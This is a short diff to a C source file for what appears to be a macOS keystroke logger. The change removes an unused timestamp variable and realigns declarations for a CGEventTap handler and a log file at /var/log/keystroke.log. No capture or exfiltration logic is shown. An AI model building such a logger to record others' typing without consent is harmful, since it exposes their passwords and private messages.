@@ -34,11 +34,10 @@
 #include "submodules/meson_deps/submodules/timestamp/timestamp.h"
 /******************************************************/
 static FILE *logfile = NULL;
-static volatile unsigned long last_ts;
-static struct StringBuffer    *sb;
+static struct StringBuffer *sb;
 /******************************************************/
-static const char             logfileLocation[] = "/var/log/keystroke.log";
-CGEventRef                    event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
+static const char          logfileLocation[] = "/var/log/keystroke.log";
+CGEventRef                 event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
 static const char *convertKeyboardCode(int);
 
 /******************************************************/
